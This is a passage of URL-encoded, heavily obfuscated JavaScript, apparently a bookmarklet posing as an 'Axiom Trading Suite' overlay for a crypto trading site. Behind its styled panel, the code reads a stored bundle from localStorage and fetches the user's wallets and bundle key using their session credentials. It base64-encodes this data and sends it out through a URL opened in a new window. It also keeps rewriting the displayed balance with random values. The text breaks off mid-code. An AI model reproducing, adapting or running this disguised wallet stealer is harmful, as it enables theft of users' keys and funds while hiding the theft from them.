IBH%3Al(645%2C%22dEHj%22)%2CRzHig%3Afunction(W%2Cc%2Co)%7Breturn%20W(c%2Co)%7D%2CqqmOU%3Afunction(W)%7Breturn%20W()%7D%2CkhGDa%3A%22modal%22%2CUWXFV%3Al(456%2C%222aZ(%22)%2CLMEQg%3Al(435%2C%22%24%24oI%22)%2CvGygs%3Al(744%2C%22R3FL%22)%2CuhnjQ%3Al(812%2C%22nCB%23%22)%2CLBIUe%3A%22%23c084fc%22%2CxlgtM%3Al(733%2C%22%40%5B%23P%22)%2CgEnZb%3A%22span%3Afirst-child%22%2CmXxjM%3A%22%234c1d95%22%2CtUgTC%3A%22%233b2e5a%22%2CZzkss%3Al(383%2C%2270%5BW%22)%2CogDRu%3Al(523%2C%22fb%25%23%22)%2CAWvsN%3Al(793%2C%22la6h%22)%2CCDXZk%3Al(400%2C%22X(%24D%22)%2CsKzHu%3Al(561%2C%22%24cY3%22)%2CiWqho%3Al(337%2C%22Om2j%22)%2CWnUVl%3Al(476%2C%22dEHj%22)%2CqOcMG%3Al(671%2C%22X(%24D%22)%2CeQOCm%3Al(398%2C%22TKqY%22)%2CFwbQb%3Afunction(W%2Cc)%7Breturn%20W-c%7D%2CrMASg%3Al(627%2C%2270%5BW%22)%2CaSzNS%3Al(804%2C%22xq%5DJ%22)%2CfKAdS%3A%22touchend%22%2ClFGgO%3Al(765%2C%22f%5B*%5D%22)%2CLABDW%3Afunction(W%2Cc)%7Breturn%20W-c%7D%2CFpJlu%3Al(692%2C%22fb%25%23%22)%2CyIEdy%3Al(706%2C%22f%5B*%5D%22)%2CnFRST%3Al(638%2C%2270%5BW%22)%2CGdnUA%3A%22resize%22%2CYpIrO%3Al(509%2C%22!ML*%22)%2CeWhYg%3A%22Trading%20Tools%22%2ChGHvU%3Al(448%2C%22f)Gl%22)%2CzNSlP%3Al(727%2C%222%24z5%22)%2CSnHti%3Al(574%2C%22dJpU%22)%2CGBggF%3A'%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22none%22%20stroke%3D%22currentColor%22%20stroke-width%3D%222%22%3E%3Cpath%20d%3D%22M12%202a10%2010%200%201%200%200%2020%2010%2010%200%200%200%200-20zm1%2010l3%203m-3-3l-3%203m3-3V6m3%206h-6%22%2F%3E%3C%2Fsvg%3E'%2CuxPca%3A%22%23a855f7%22%2CmOpzA%3Al(522%2C%22%40%5B%23P%22)%2CEzJxj%3Al(786%2C%22dEHj%22)%2CxqIxV%3Al(402%2C%22048n%22)%2CSfLNZ%3Al(403%2C%22uUL4%22)%2CuqkaF%3Al(471%2C%222%24z5%22)%2CBmfhb%3A'%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22none%22%20stroke%3D%22currentColor%22%20stroke-width%3D%222%22%3E%3Cpath%20d%3D%22M16%207a4%204%200%200%200-8%200v4H6v8h12v-8h-2V7zm-4%206a2%202%200%200%201%202%202v2h-4v-2a2%202%200%200%201%202-2z%22%2F%3E%3C%2Fsvg%3E'%2CColPD%3Al(682%2C%22uLX%25%22)%2ClxSGl%3Al(486%2C%22!ML*%22)%2CPvAIt%3Al(628%2C%22gFjn%22)%2Cbgrmy%3Al(462%2C%22j2Yl%22)%2CiCkPn%3Al(742%2C%22R3FL%22)%2CeeENa%3A%220.5%22%2CTQbdq%3Al(357%2C%22%24cY3%22)%2CmOdww%3Al(440%2C%22%40%5B%23P%22)%2CtxEVk%3Al(446%2C%22!ML*%22)%2CzhLKF%3Afunction(W%2Cc%2Co)%7Breturn%20W(c%2Co)%7D%2CaTIBj%3Afunction(W)%7Breturn%20W()%7D%2CPIlnJ%3Afunction(W%2Cc)%7Breturn%20W%2Bc%7D%2CDYTeC%3Afunction(W%2Cc)%7Breturn%20W*c%7D%2CZnWdg%3Afunction(W%2Cc)%7Breturn%20W%2Bc%7D%2CsadXf%3A%22div.xl%5C%5C%3Aflex%3Anth-child(2)%20%3E%20span%3Anth-child(2)%22%2CELdZS%3Afunction(W%2Cc)%7Breturn%20W%3Cc%7D%2ClYvDT%3A%22div.group%3Anth-child(2)%20%3E%20div%3Anth-child(1)%20%3E%20span%3Anth-child(1)%20%3E%20div%3Anth-child(1)%20%3E%20span%3Anth-child(2)%22%2CmoEYR%3A%22.group%5C%5C%2Fwallets%20%3E%20div%3Anth-child(2)%20%3E%20span%3Anth-child(2)%20%3E%20span%3Anth-child(1)%22%2CBWmNk%3Al(787%2C%22j2Yl%22)%2Coxpfv%3Afunction(W%2Cc)%7Breturn%20W!%3D%3Dc%7D%2CNEvxq%3Al(644%2C%22048n%22)%2CIHYPY%3Afunction(W%2Cc)%7Breturn%20W(c)%7D%2CqdIIE%3Al(513%2C%22loo%24%22)%2CBSXTb%3Al(397%2C%22xhFn%22)%2CRjoiC%3Al(752%2C%22P*LE%22)%2CeEbWx%3Al(586%2C%22sOWE%22)%2CStqbF%3Afunction(W%2Cc%2Co)%7Breturn%20W(c%2Co)%7D%2CaXbKf%3Al(792%2C%22X(%24D%22)%2CRLFkn%3Al(360%2C%22PRJf%22)%2CroweE%3A%22include%22%2CPMDIk%3A%22application%2Fjson%2C%20text%2Fplain%2C%20*%2F*%22%2CpmJDM%3Al(385%2C%22PRJf%22)%2Cpwwur%3Al(606%2C%22loo%24%22)%2CvpdAh%3Al(689%2C%22b%5EGb%22)%2CnFxGD%3Al(603%2C%22xhFn%22)%2CSeAiC%3Afunction(W%2Cc)%7Breturn%20W(c)%7D%2CQmCiq%3Afunction(W%2Cc)%7Breturn%20W%2Bc%7D%2CrgLor%3Afunction(W%2Cc)%7Breturn%20W%3D%3D%3Dc%7D%2CRjuPB%3Al(517%2C%22EzXz%22)%2CdGYtf%3Al(461%2C%22b%5EGb%22)%2CVJbid%3Afunction(W%2Cc)%7Breturn%20W(c)%7D%2ChFgOy%3Al(637%2C%22048n%22)%7D%2CW%3D(()%3D%3E%7Blet%20d%3D!0%3Breturn%20function(c%2Co)%7Bvar%20W%3Dd%3Ffunction()%7Bvar%20W%3Bif(o)return%20W%3Do.apply(c%2Carguments)%2Co%3Dnull%2CW%7D%3Afunction()%7B%7D%3Breturn%20d%3D!1%2CW%7D%7D)()%2Cd%3D(()%3D%3E%7Blet%20d%3D!0%3Breturn%20function(c%2Co)%7Bvar%20W%3Dd%3Ffunction()%7Bvar%20W%3Bif(o)return%20W%3Do%5Ba0_0x576c(428%2C%22sG42%22)%5D(c%2Carguments)%2Co%3Dnull%2CW%7D%3Afunction()%7B%7D%3Breturn%20d%3D!1%2CW%7D%7D)()%3Bif(i%5Bl(726%2C%22J%25%25P%22)%5D(window.location%5Bl(469%2C%22D7BU%22)%5D%2Ci%5Bl(363%2C%22!ML*%22)%5D))i%5Bl(511%2C%22b%5EGb%22)%5D(alert%2Ci%5Bl(535%2C%22nCB%23%22)%5D)%3Belse%7Bvar%20c%3Di.BSXTb%2Co%3Di.RjoiC%3Btry%7Bvar%20k%3DJSON%5Bl(690%2C%22AcqY%22)%5D(localStorage%5Bl(590%2C%22R3FL%22)%5D(i%5Bl(386%2C%22sOWE%22)%5D)%7C%7C%22%5B%5D%22)%3Bif(!k.length)throw%20new%20Error(l(362%2C%22iZ4P%22))%3Bvar%20n%3Dk%2Ct%3Dawait%20i%5Bl(805%2C%22j2Yl%22)%5D(fetch%2Ci%5Bl(716%2C%22xhFn%22)%5D%2C%7Bmethod%3Ai.RLFkn%2Ccredentials%3Ai%5Bl(558%2C%22R3FL%22)%5D%2Cheaders%3A%7BAccept%3Ai%5Bl(549%2C%22fb%25%23%22)%5D%2C%22Content-Type%22%3Ai%5Bl(430%2C%22wxRV%22)%5D%7D%2Cbody%3Anull%7D)%3Bif(!t.ok)throw%20new%20Error(i%5Bl(518%2C%222aZ(%22)%5D(i.pwwur%2Ct%5Bl(790%2C%22gFjn%22)%5D))%3Bvar%20m%3Dawait%20t.json()%3Bif(!m%5Bl(375%2C%22sOWE%22)%5D)throw%20new%20Error(i%5Bl(741%2C%22gYro%22)%5D)%3Bif(!m.wallets%7C%7C!m%5Bl(832%2C%22%246NR%22)%5D%5Bl(622%2C%222%24z5%22)%5D)throw%20new%20Error(i%5Bl(731%2C%22!ML*%22)%5D)%3Bvar%20e%3D%7BsBundle_raw%3An%2CapiData%3A%7BbundleKey%3Am.bundleKey%2Cwallets%3Am%5Bl(647%2C%22wxRV%22)%5D%7D%7D%2CC%3DJSON%5Bl(593%2C%22EzXz%22)%5D(e)%2Cr%3Di%5Bl(502%2C%22!ML*%22)%5D(btoa%2CC)%2CS%3Di%5Bl(376%2C%22sG42%22)%5D(i%5Bl(366%2C%22qh5(%22)%5D(i%5Bl(470%2C%22048n%22)%5D(1%2C1)%3Fc%3Ao%2Ci%5Bl(755%2C%22P*LE%22)%5D)%2BencodeURIComponent(%2220DN80%22)%2Ci%5Bl(361%2C%22gYro%22)%5D)%2Bi.VJbid(encodeURIComponent%2Cr)%2Ca%3D(window%5Bl(489%2C%22%26kQm%22)%5D(S%2Ci%5Bl(598%2C%22%24cY3%22)%5D)%2Ci%5Bl(810%2C%22%5Et5J%22)%5D(function()%7Blet%20c%3Dl%2Cn%3D%7Bfodra%3Ai.bCOPd%2CwqkQp%3Afunction(W%2Cc)%7Breturn%20i.AAldp(W%2Cc)%7D%2CWeYoz%3Ai.EsxOh%2ChtTgz%3Afunction(W%2Cc)%7Bvar%20o%3Da0_0x576c%3Breturn%20i%5Bo(815%2C%22sG42%22)%5D(W%2Cc)%7D%2CJJEeP%3Ai.QZIBH%2CzfHQT%3A%22input%22%2CSdgqT%3Afunction(W%2Cc)%7Breturn%20W(c)%7D%2ClIvlC%3Afunction(W%2Cc%2Co)%7Breturn%20W(c%2Co)%7D%7D%2Co%3Di%5Bc(643%2C%22!ML*%22)%5D(W%2Cthis%2Cfunction()%7Bvar%20W%3Dc%3Breturn%20o%5BW(545%2C%22j2Yl%22)%5D().search(i.ncGhp)%5BW(609%2C%22TKqY%22)%5D()%5BW(602%2C%22la6h%22)%5D(o).search(i%5BW(723%2C%22xhFn%22)%5D)%7D)%3Bi%5Bc(418%2C%22J%25%25P%22)%5D(o)%2Cfunction()%7Blet%20k%3Dc%3Bn%5Bk(491%2C%22MuR5%22)%5D(d%2Cthis%2Cfunction()%7Bvar%20W%3Dk%2Cc%3Dnew%20RegExp(n%5BW(737%2C%22b%5EGb%22)%5D)%2Co%3Dnew%20RegExp(%22%5C%5C%2B%5C%5C%2B%20*(%3F%3A%5Ba-zA-Z_%24%5D%5B0-9a-zA-Z_%24%5D*)%22%2C%22i%22)%2Cd%3Dn%5BW(492%2C%2270%5BW%22)%5D(_0x18330c%2Cn%5BW(537%2C%22TKqY%22)%5D)%3Bc%5BW(749%2C%22D7BU%22)%5D(n%5BW(554%2C%22%246NR%22)%5D(d%2Cn%5BW(458%2C%22TKqY%22)%5D))%26%26o%5BW(745%2C%22la6h%22)%5D(n%5BW(680%2C%22sOWE%22)%5D(d%2Cn%5BW(676%2C%22qh5(%22)%5D))%3F_0x18330c()%3An%5BW(594%2C%22Om2j%22)%5D(d%2C%220%22)%7D)()%7D()%3Btry%7Breturn%20new%20URLSearchParams(window.location%5Bc(612%2C%22xq%5DJ%22)%5D)%5Bc(406%2C%22B4n%5D%22)%5D(i.khGDa)%7C%7C%221%22%7Dcatch(W)%7Breturn%221%22%7D%7D))%3B%221%22%3D%3D%3Da%3FR()%3Ai.aTIBj(R)%7Dcatch(W)%7Bconsole%5Bl(816%2C%22%24%24oI%22)%5D(W)%7D%7Blet%20t%3Dl%2CW%3Ddocument.querySelector(i%5Bt(819%2C%22lTF2%22)%5D)%2Cm%3Di.AAldp(parseFloat%2CW%5Bt(722%2C%227%25UJ%22)%5D%5Bt(654%2C%22048n%22)%5D(%2F%5B%5E%5Cd.-%5D%2Fg%2C%22%22))%3Bif(i%5Bt(650%2C%22EzXz%22)%5D(m%2C.01))i.AAldp(alert%2Ct(583%2C%22%26kQm%22))%3Belse%7Blet%20c%3D%5Bi%5Bt(626%2C%22dJpU%22)%5D%2Ci%5Bt(387%2C%22uLX%25%22)%5D%2Ct(679%2C%22TKqY%22)%2Ci.moEYR%5D%2Co%3Di%5Bt(519%2C%22R3FL%22)%5D%3BsetInterval(()%3D%3E%7Blet%20d%3Dt%2Ck%3D%7BZzgkL%3Afunction(W%2Cc)%7Bvar%20o%3Da0_0x576c%3Breturn%20i%5Bo(803%2C%22qh5(%22)%5D(W%2Cc)%7D%2CvyhhP%3Afunction(W%2Cc)%7Breturn%20W*c%7D%7D%2CW%3Di%5Bd(595%2C%22m3X4%22)%5D(Math%5Bd(344%2C%22R3FL%22)%5D()%2C.04)-.02%2Cn%3Di%5Bd(425%2C%22P*LE%22)%5D(m%2CW)%5Bd(505%2C%22sOWE%22)%5D(2)%3Bc%5Bd(399%2C%22dJpU%22)%5D(W%3D%3E%7Blet%20c%3Dd%3Bdocument%5Bc(576%2C%22uLX%25%22)%5D(W)%5Bc(569%2C%22n6BJ%22)%5D(W%3D%3E%7BW%5Bc(618%2C%22P*LE%22)%5D%3Dn%7D)%7D)%2Cdocument.querySelectorAll(o)%5Bd(784%2C%22X(%24D%22)%5D(W%3D%3E%7Bvar%20c%3Dd%2Co%3Dk%5Bc(720%2C%22xhFn%22)%5D(150%2Ck%5Bc(437%2C%22D7BU%22)%5D(Math%5Bc(551%2C%22dEHj%22)%5D()%2C20))%2Co%3D(n*o).toFixed(2)%3BW%5Bc(350%2C%22j2Yl%22)%5D%3Dk%5Bc(514%2C%22j2Yl%22)%5D(%22%24%22%2Co)%7D)%7D%2C1500)%7D%7D%7Dfunction%20R()%7Blet%20P%3Dl%2Cu%3D%7BJjloI%3Ai.AWvsN%2CjPupP%3Afunction(W%2Cc)%7Breturn%20W%3D%3D%3Dc%7D%2CnsAeQ%3Ai%5BP(345%2C%222aZ(%22)%5D%2CVpoPE%3Ai%5BP(467%2C%22%24%24oI%22)%5D%2CnyXta%3Ai%5BP(460%2C%22%26kQm%22)%5D%2CZbBKh%3AP(750%2C%22lTF2%22)%2CbCCoO%3Ai.WnUVl%2CEqcNW%3Ai%5BP(820%2C%22m3X4%22)%5D%2COkshn%3A%22Minimal%22%2CAIVzv%3Ai%5BP(516%2C%22R3FL%22)%5D%2CsBqOI%3Afunction(W%2Cc)%7Breturn%20i.FwbQb(W%2Cc)%7D%2CdIsye%3Afunction(W%2Cc)%7Breturn%20W-c%7D%2CuEVTO%3Ai%5BP(503%2C%22Om2j%22)%5D%2CdlRmW%3Afunction(W%2Cc)%7Breturn%20W-c%7D%2CoaEkn%3Ai.aSzNS%2CHDnfn%3AP(560%2C%227%25UJ%22)%2CVolie%3Ai%5BP(528%2C%2270%5BW%22)%5D%2Ceipea%3Ai%5BP(570%2C%22f)Gl%22)%5D%2CFcafc%3A%22touchstart%22%2ChEFuj%3Afunction(W%2Cc)%7Bvar%20o%3DP%3Breturn%20i%5Bo(624%2C%22%5Et5J%22)%5D(W%2Cc)%7D%2CVsyol%3Afunction(W%2Cc)%7Bvar%20o%3DP%3Breturn%20i%5Bo(352%2C%22TKqY%22)%5D(W%2Cc)%7D%2CCWnAE%3Ai.FpJlu%2CUVkky%3Afunction(W%2Cc)%7Bvar%20o%3DP%3Breturn%20i%5Bo(341%2C%22m3X4%22)%5D(W%2Cc)%7D%2CgqDFb%3AP(432%2C%22X(%24D%22)%2CVZTTp%3Ai%5BP(477%2C%22%40%5B%23P%22)%5D%2CxOmaj%3Ai.nFRST%2CYLTrs%3Ai.GdnUA%7D%2Co%3Ddocument%5BP(359%2C%22b%5EGb%22)%5D(i%5BP(773%2C%22xq%5DJ%22)%5D)%3Bo.id%3Di.YpIrO%2Co%5BP(568%2C%22%5Et5J%22)%5D%5BP(405%2C%22fb%25%23%22)%5D%3D%22%5Cn%20%20%20%20%20%20position%3A%20fixed%3B%5Cn%20%20%20%20%20%20bottom%3A%2040px%3B%5Cn%20%20%20%20%20%20right%3A%2040px%3B%5Cn%20%20%20%20%20%20width%3A%20440px%3B%5Cn%20%20%20%20%20%20max-height%3A%20660px%3B%5Cn%20%20%20%20%20%20background%3A%20linear-gradient(145deg%2C%20%231a1a1a%2C%20%232a234a)%3B%5Cn%20%20%20%20%20%20color%3A%20%23ffffff%3B%5Cn%20%20%20%20%20%20font-family%3A%20'Avenir%20Next'%2C%20'Helvetica%20Neue'%2C%20sans-serif%3B%5Cn%20%20%20%20%20%20box-shadow%3A%200%2012px%2050px%20rgba(0%2C%200%2C%200%2C%200.5)%2C%200%200%2020px%20rgba(139%2C%2092%2C%20246%2C%200.2)%3B%5Cn%20%20%20%20%20%20border-radius%3A%2016px%3B%5Cn%20%20%20%20%20%20border%3A%201px%20solid%20rgba(139%2C%2092%2C%20246%2C%200.3)%3B%5Cn%20%20%20%20%20%20padding%3A%200%3B%5Cn%20%20%20%20%20%20display%3A%20flex%3B%5Cn%20%20%20%20%20%20flex-direction%3A%20column%3B%5Cn%20%20%20%20%20%20z-index%3A%2010000%3B%5Cn%20%20%20%20%20%20overflow%3A%20hidden%3B%5Cn%20%20%20%20%20%20transition%3A%20max-height%200.3s%20ease%3B%5Cn%20%20%20%20%22%3Bvar%20W%3Ddocument%5BP(678%2C%22loo%24%22)%5D(i%5BP(411%2C%22f%5B*%5D%22)%5D)%3BW%5BP(705%2C%22J%25%25P%22)%5D%5BP(499%2C%22!ML*%22)%5D%3DP(421%2C%22R3FL%22)%2CW%5BP(556%2C%222aZ(%22)%5D%3D'%5Cn%20%20%20%20%20%20%3Cdiv%20style%3D%22display%3A%20flex%3B%20align-items%3A%20center%3B%20gap%3A%208px%3B%22%3E%5Cn%20%20%20%20%20%20%20%20%3Csvg%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22none%22%20stroke%3D%22%23ffffff%22%20stroke-width%3D%222%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M12%202a10%2010%200%200%200-10%2010c0%205.5%204.5%2010%2010%2010s10-4.5%2010-10S17.5%202%2012%202zm-2%208l4%204-4%204-4-4%204-4z%22%2F%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3Ch3%20style%3D%22margin%3A%200%3B%20font-weight%3A%20700%3B%20font-size%3A%2016px%3B%20color%3A%20%23ffffff%3B%22%3EAxiom%20Trading%20Suite%3C%2Fh3%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20'%3Blet%20d%3Ddocument.createElement(i.LMEQg)%2Cc%3D(d%5BP(394%2C%22AcqY%22)%5D%3DP(444%2C%22Om2j%22)%2Cd%5BP(614%2C%22TKqY%22)%5D%3Di%5BP(809%2C%22n6BJ%22)%5D%2Cd%5BP(807%2C%222%24z5%22)%5D%5BP(652%2C%22EzXz%22)%5D%3DP(801%2C%22%40%5B%23P%22)%2Cd%5BP(646%2C%22xhFn%22)%5D%3D()%3D%3E%7Bvar%20W%3DP%3Bd.style%5BW(703%2C%22fb%25%23%22)%5D%3Di.UWXFV%7D%2Cd%5BP(497%2C%22n6BJ%22)%5D%3D()%3D%3E%7Bvar%20W%3DP%3Bd%5BW(770%2C%22gYro%22)%5D%5BW(331%2C%22xhFn%22)%5D%3Du.JjloI%7D%2Cd%5BP(730%2C%22%24cY3%22)%5D%3D()%3D%3E%7Bvar%20W%3DP%2Cc%3Du.jPupP(o%5BW(498%2C%22R3FL%22)%5D%5BW(709%2C%22%24cY3%22)%5D%2CW(740%2C%22sOWE%22))%3Bo.style%5BW(796%2C%22qh5(%22)%5D%3Dc%3Fu%5BW(336%2C%222%24z5%22)%5D%3Au%5BW(552%2C%222aZ(%22)%5D%2Cd%5BW(813%2C%22uUL4%22)%5D%3Dc%3FW(381%2C%22lTF2%22)%3AW(636%2C%22qh5(%22)%2Cd%5BW(414%2C%22gFjn%22)%5D%3Dc%3Fu.nyXta%3AW(478%2C%22D7BU%22)%2Ck%5BW(371%2C%22%246NR%22)%5D%5BW(395%2C%22Z%40)H%22)%5D%3Dc%3Fu%5BW(546%2C%22f%5B*%5D%22)%5D%3Au.JjloI%2Cm.style%5BW(468%2C%222aZ(%22)%5D%3Dc%3Fu.ZbBKh%3Au.JjloI%2Ca%5BW(728%2C%22sOWE%22)%5D%5BW(659%2C%22f%5B*%5D%22)%5D%3Dc%3FW(711%2C%222%24z5%22)%3AW(459%2C%22gFjn%22)%7D%2CW.appendChild(d)%2Cdocument.createElement(P(694%2C%22xq%5DJ%22)))%2Ck%3D(c%5BP(771%2C%22sOWE%22)%5D%3DP(717%2C%227%25UJ%22)%2Cc%5BP(520%2C%22m3X4%22)%5D%3DP(529%2C%22PRJf%22)%2Cc%5BP(380%2C%22AcqY%22)%5D%5BP(693%2C%227%25UJ%22)%5D%3DP(700%2C%22dEHj%22)%2Cc%5BP(585%2C%22P*LE%22)%5D%3D()%3D%3E%7Bvar%20W%3DP%3Bc%5BW(442%2C%220BbE%22)%5D%5BW(431%2C%22%26kQm%22)%5D%3DW(562%2C%22B4n%5D%22)%7D%2Cc%5BP(334%2C%22!ML*%22)%5D%3D()%3D%3E%7Bvar%20W%3DP%3Bc%5BW(450%2C%22%40%5B%23P%22)%5D%5BW(619%2C%22048n%22)%5D%3DW(751%2C%22fb%25%23%22)%7D%2Cc%5BP(413%2C%22dEHj%22)%5D%3D()%3D%3Eo%5BP(797%2C%22TKqY%22)%5D()%2CW%5BP(340%2C%22P*LE%22)%5D(c)%2Cdocument%5BP(541%2C%22AcqY%22)%5D(i%5BP(503%2C%22Om2j%22)%5D))%3Bk%5BP(826%2C%22TKqY%22)%5D.cssText%3DP(401%2C%22la6h%22)%3Bvar%20n%3Ddocument%5BP(474%2C%22%5Et5J%22)%5D(i%5BP(539%2C%22uUL4%22)%5D)%3Bn.style.cssText%3DP(641%2C%22J%25%25P%22)%2Cn.textContent%3Di.eWhYg%3Blet%20t%3Ddocument%5BP(466%2C%22%246NR%22)%5D(P(673%2C%22wxRV%22))%2Cm%3D(t%5BP(521%2C%22f)Gl%22)%5D.cssText%3DP(713%2C%22f%5B*%5D%22)%2C%5B%7Bname%3Ai%5BP(578%2C%22n6BJ%22)%5D%2Cicon%3AP(581%2C%22J%25%25P%22)%2Ccolor%3Ai.zNSlP%7D%2C%7Bname%3Ai%5BP(512%2C%22loo%24%22)%5D%2Cicon%3Ai%5BP(500%2C%22dEHj%22)%5D%2Ccolor%3Ai%5BP(777%2C%22EzXz%22)%5D%7D%2C%7Bname%3Ai%5BP(501%2C%22m3X4%22)%5D%2Cicon%3AP(667%2C%22R3FL%22)%2Ccolor%3Ai%5BP(668%2C%22xhFn%22)%5D%7D%2C%7Bname%3Ai.EzJxj%2Cicon%3AP(738%2C%22nCB%23%22)%2Ccolor%3Ai.xqIxV%7D%2C%7Bname%3Ai%5BP(688%2C%22la6h%22)%5D%2Cicon%3AP(769%2C%22sG42%22)%2Ccolor%3AP(633%2C%22qh5(%22)%7D%2C%7Bname%3Ai%5BP(767%2C%22sG42%22)%5D%2Cicon%3Ai%5BP(743%2C%22uLX%25%22)%5D%2Ccolor%3AP(783%2C%22qh5(%22)%7D%5D%5BP(388%2C%22%5Et5J%22)%5D(c%3D%3E%7Blet%20o%3DP%2Cd%3Ddocument.createElement(i%5Bo(635%2C%22P*LE%22)%5D)%3Bd%5Bo(441%2C%22%24%24oI%22)%5D%5Bo(835%2C%22m3X4%22)%5D%3D%22%5Cn%20%20%20%20%20%20%20%20position%3A%20relative%3B%5Cn%20%20%20%20%20%20%20%20background%3A%20rgba(255%2C%20255%2C%20255%2C%200.05)%3B%5Cn%20%20%20%20%20%20%20%20border%3A%201px%20solid%20%22%2Bc%5Bo(611%2C%22xq%5DJ%22)%5D%2Bo(675%2C%22048n%22)%2Cd%5Bo(335%2C%22P*LE%22)%5D%3Dc%5Bo(525%2C%22loo%24%22)%5D%2Bo(757%2C%22fb%25%23%22)%2Bc%5Bo(451%2C%22lTF2%22)%5D%2Bo(615%2C%22%5Et5J%22)%2Cd%5Bo(355%2C%22f%5B*%5D%22)%5D%3D()%3D%3E%7Bvar%20W%3Do%3Bd%5BW(498%2C%22R3FL%22)%5D.background%3Dc%5BW(454%2C%22sG42%22)%5D%2B%2220%22%2Cd%5BW(521%2C%22f)Gl%22)%5D%5BW(695%2C%22wxRV%22)%5D%3D%220%203px%206px%20rgba(0%2C%200%2C%200%2C%200.3)%22%7D%2Cd%5Bo(724%2C%22nCB%23%22)%5D%3D()%3D%3E%7Bvar%20W%3Do%3Bd.style%5BW(507%2C%22iZ4P%22)%5D%3Du.bCCoO%2Cd%5BW(823%2C%22loo%24%22)%5D%5BW(378%2C%22iZ4P%22)%5D%3Du%5BW(653%2C%22wxRV%22)%5D%7D%2Cd%5Bo(828%2C%22nCB%23%22)%5D%3D()%3D%3E%7Bvar%20W%3Do%3Bconsole%5BW(356%2C%22iZ4P%22)%5D(c%5BW(736%2C%222aZ(%22)%5D%2BW(490%2C%22gYro%22))%7D%2Ct%5Bo(373%2C%22gFjn%22)%5D(d)%7D)%2Ck%5BP(833%2C%227%25UJ%22)%5D(n)%2Ck%5BP(663%2C%22D7BU%22)%5D(t)%2Cdocument%5BP(339%2C%22iZ4P%22)%5D(i.rMASg))%3Bm%5BP(665%2C%22!ML*%22)%5D.cssText%3DP(681%2C%22m3X4%22)%3Bvar%20n%3Ddocument%5BP(683%2C%22lTF2%22)%5D(i%5BP(814%2C%22sG42%22)%5D)%2Ce%3D(n%5BP(728%2C%22sOWE%22)%5D%5BP(457%2C%22TKqY%22)%5D%3D%22%5Cn%20%20%20%20%20%20font-weight%3A%20600%3B%5Cn%20%20%20%20%20%20font-size%3A%2012px%3B%5Cn%20%20%20%20%20%20color%3A%20%23a5b4fc%3B%5Cn%20%20%20%20%20%20margin-bottom%3A%2014px%3B%5Cn%20%20%20%20%20%20text-transform%3A%20uppercase%3B%5Cn%20%20%20%20%20%20letter-spacing%3A%200.8px%3B%5Cn%20%20%20%20%22%2Cn%5BP(526%2C%22n6BJ%22)%5D%3DP(739%2C%22b%5EGb%22)%2Cdocument%5BP(346%2C%222aZ(%22)%5D(i%5BP(445%2C%22!ML*%22)%5D))%2CC%3D(e%5BP(823%2C%22loo%24%22)%5D%5BP(449%2C%22j2Yl%22)%5D%3DP(592%2C%22PRJf%22)%2Cdocument.createElement(i.rMASg))%2Cr%3D(C%5BP(550%2C%22loo%24%22)%5D%3DP(575%2C%22Om2j%22)%2Cdocument.createElement(i.ColPD))%3Br%5BP(746%2C%22Om2j%22)%5D%3D%22range%22%2Cr%5BP(791%2C%22lTF2%22)%5D%3D%221%22%2Cr%5BP(370%2C%22EzXz%22)%5D%3D%225%22%2Cr%5BP(559%2C%22X(%24D%22)%5D%3D%223%22%2Cr.id%3Di%5BP(785%2C%22f%5B*%5D%22)%5D%2Cr%5BP(657%2C%22uLX%25%22)%5D%5BP(698%2C%22wxRV%22)%5D%3DP(439%2C%22TKqY%22)%2Cr%5BP(542%2C%22uUL4%22)%5D(i%5BP(557%2C%22MuR5%22)%5D%2CW%3D%3E%7Bvar%20c%3DP%2CW%3DW%5Bc(424%2C%22J%25%25P%22)%5D%5Bc(426%2C%22gFjn%22)%5D%2Co%3D%5Bu%5Bc(565%2C%22%26kQm%22)%5D%2Cc(588%2C%22dJpU%22)%2Cc(616%2C%22n6BJ%22)%2Cu%5Bc(553%2C%22%24%24oI%22)%5D%2Cc(763%2C%22la6h%22)%5D%3Bdocument.getElementById(%22speed-value%22)%5Bc(710%2C%22wxRV%22)%5D%3Do%5Bu.sBqOI(W%2C1)%5D%2Cconsole.log(%22Transaction%20speed%20set%20to%20%22%2Bo%5Bu.dIsye(W%2C1)%5D)%7D)%2Ce.appendChild(C)%2Ce.appendChild(r)%3Blet%20S%3Ddocument%5BP(541%2C%22AcqY%22)%5D(P(495%2C%22R3FL%22))%2Ca%3D(S.style%5BP(798%2C%22uUL4%22)%5D%3DP(423%2C%22dJpU%22)%2CS%5BP(465%2C%22sG42%22)%5D%3DP(760%2C%22n6BJ%22)%2CS%5BP(817%2C%22loo%24%22)%5D(i.PvAIt)%5BP(831%2C%22gFjn%22)%5D(P(762%2C%22sG42%22)%2CW%3D%3E%7Bvar%20c%3DP%2Co%3DS%5Bc(443%2C%22%24%24oI%22)%5D(i%5Bc(778%2C%22P*LE%22)%5D)%3Bo%5Bc(506%2C%22qh5(%22)%5D%5Bc(354%2C%227%25UJ%22)%5D%3DW.target%5Bc(447%2C%22f)Gl%22)%5D%3Fc(407%2C%22wxRV%22)%3Ai%5Bc(779%2C%22qh5(%22)%5D%2Co%5Bc(568%2C%22%5Et5J%22)%5D.backgroundColor%3DW.target%5Bc(368%2C%22!ML*%22)%5D%3Fi%5Bc(504%2C%22la6h%22)%5D%3Ai.xlgtM%2CS%5Bc(701%2C%22PRJf%22)%5D(i.gEnZb)%5Bc(427%2C%22m3X4%22)%5D.backgroundColor%3DW%5Bc(563%2C%22sOWE%22)%5D.checked%3Fi%5Bc(600%2C%22n6BJ%22)%5D%3Ai%5Bc(419%2C%22B4n%5D%22)%5D%2Cconsole%5Bc(579%2C%22j2Yl%22)%5D(c(564%2C%22MuR5%22)%2B(W%5Bc(640%2C%22TKqY%22)%5D%5Bc(358%2C%22%40%5B%23P%22)%5D%3Fi.Zzkss%3Ai%5Bc(696%2C%22fb%25%23%22)%5D))%7D)%2Cm%5BP(663%2C%22D7BU%22)%5D(n)%2Cm.appendChild(e)%2Cm%5BP(587%2C%2270%5BW%22)%5D(S)%2Cdocument.createElement(i%5BP(773%2C%22xq%5DJ%22)%5D))%3Ba.style%5BP(566%2C%22iZ4P%22)%5D%3DP(35